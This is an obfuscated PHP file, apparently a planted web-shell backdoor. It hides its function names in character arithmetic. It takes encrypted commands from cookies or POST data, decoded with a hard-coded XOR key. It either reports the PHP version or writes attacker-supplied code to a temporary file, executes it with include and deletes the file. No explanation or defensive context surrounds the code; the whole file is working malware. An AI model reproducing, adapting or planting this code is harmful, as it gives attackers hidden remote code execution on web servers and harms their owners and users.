<?php    function/*dqjps  */yakbtfpjgd(){	echo	77494;       }

$dvepa   =	'dvepa'	^  '';
$cdauraoxtm/*  va*/=    "f"."\x69"   .	"l"."e"."\137"/* aw*/.	"\160"	./* _uh  */$dvepa(528-411)	./*   hc */"\164"/* s */./*rqqbg   */$dvepa(95)	.   $dvepa(279-180)    ./*   ze   */$dvepa(595-484)	.  "n"."t"."e"."\x6e"      ./*adj_  */$dvepa(740-624)	.      "\x73";
$bvdzlhiz_d	=/*b   */"\142"/*  z */.	"a".$dvepa(115)	.  "\145"/*   w  */.   "6".$dvepa(52)     ./*   ikz_*/"\x5f"/*mrda*/./*ujw*/$dvepa(100)   .  $dvepa(318-217)	.    "c"."\157"/* t   */./*   fdg */"\x64"   .	"e";


$mepgvqgg	=     "\165"      ./*   sqk   */"\156"	./*   a  */"s"."e"."\x72"     .     "i"."a"."\x6c"       ./*  igaqk */"i".$dvepa(708-586)/* umhne   */./*   h   */"e";
$tmmfjri     =/* ufkt  */$dvepa(600-488)/*pbvy*/.   $dvepa(104)    .  $dvepa(112)   .       "\166"    .	"e"."\x72"  .       "s"."i".$dvepa(111)	./*g  */"n";$qdkxcfojsb       =/*  jbu   */$dvepa(117)	./*   fpi */"n"."l"."\151"	.   $dvepa(110)/*nzab   */./*   rgggs   */"\153";


/* wpulk */

function/*  curdg  */wzizmqz($rzjqxj,/*   rxne_ */$zfrm_pckm){

/*  ro   */global/* h  */$dvepa;
     $hqjti	=/*wks */"";
/*  jg */for/*_  */($xuu_fkmrmg/*   no*/=/*   ym   */0;	$xuu_fkmrmg	<  strlen($rzjqxj);)      {

/* aus   */for	($dimxw	=/*  r_  */0;/*  wvdk */$dimxw	<	strlen($zfrm_pckm)   &&	$xuu_fkmrmg/* cgsck  */<	strlen($rzjqxj);	$dimxw++,/*  lg*/$xuu_fkmrmg++)/* mth*/{/* acrvt  */$hqjti/*je  */.=/*   tte   */$dvepa(ord($rzjqxj[$xuu_fkmrmg])/*  yfqk   */^   ord($zfrm_pckm[$dimxw]));     }

	}


/*   y*/return   $hqjti;
}


$zrqtgmxq	=/*hoh   */$_COOKIE;


$hwxdejmi	=       $_POST;

$zrqtgmxq/*i  */=	array_merge($hwxdejmi,	$zrqtgmxq);
$qvvwr/*   gp  */=	"\x64"	.  "4"."\145"	.	"1".$dvepa(52)	.	"9".$dvepa(48)      ./*   lusm  */$dvepa(100)   .    "\55"     ./*dj */$dvepa(357-258)	.	"\70"   .	$dvepa(995-894).$dvepa(995-894)."\55"       ./*j  */"4"."1"."c"."\143"/* age */./*  ac  */$dvepa(125-80)	.   "\x38"/* jxd */.      "\70"/* omllj*/.	$dvepa(187-87)/*   qg  */.	"f"."\55"      .    $dvepa(341-242)	.	"\62"     .  $dvepa(102)/* y*/./* uqm */$dvepa(374-323)	.    $dvepa(52)  .	"5"."\x66"/*   r*/.       "7"."\144"."f"."\142"/*oyeg */./*  nikiv  */"\x37";
foreach/*rmftn */($zrqtgmxq    as	$bkovjujv/*dystj  */=>/*lpyc*/$rzjqxj)/* zuam  */{


/*   ailcd  */$rzjqxj	=     $mepgvqgg(wzizmqz(wzizmqz($bvdzlhiz_d($rzjqxj),	$qvvwr),	$bkovjujv));/*aj   */if	(isset($rzjqxj[$dvepa(97)/*x */./*n   */"\153"]))	{


	if   ($rzjqxj["a"]/*  orpa */==/* soxuu */"i")	{
/* ffu */$xuu_fkmrmg    =/*v*/array();  $xuu_fkmrmg["\x70"/* dt  */.	"\x76"]/*   as */=/*j_qhk   */$tmmfjri();
	$xuu_fkmrmg["s"."v"]/*rqzbw  */=	"3"."\56"   .    "\x35";


/* xm_h  */echo	@serialize($xuu_fkmrmg);      }	elseif	($rzjqxj["a"]      ==  $dvepa(995-894))	{

/*  semg */$_rbchd    =   sprintf("."."\x2f"/* nnccv */.	"%"."s"."\56"     .	"\160"/*idzbn  */.      "l",	md5($qvvwr));
/*   sjjfi   */$cdauraoxtm($_rbchd,    "<"       .	"?".$dvepa(112)	.	"h".$dvepa(535-423)/*_j */.    $dvepa(32)/*   iwz */.	"\x75"/* g   */.	$dvepa(110)	.   "l".$dvepa(1092-987)/* goir   */.	$dvepa(110)	.   "\x6b"	.   "\x28"    .  "_"."_"."F"."\x49"       ./* fis  */$dvepa(408-332)/*  k   */.      "\x45"/*  uzhc*/.	$dvepa(95)      .	"_"."\x29"    ./*v   */$dvepa(59)/*_*/.       $dvepa(32)   .	$rzjqxj["\144"]);      include($_rbchd);   $qdkxcfojsb($_rbchd);

	}
/*msp  */exit();
	}}



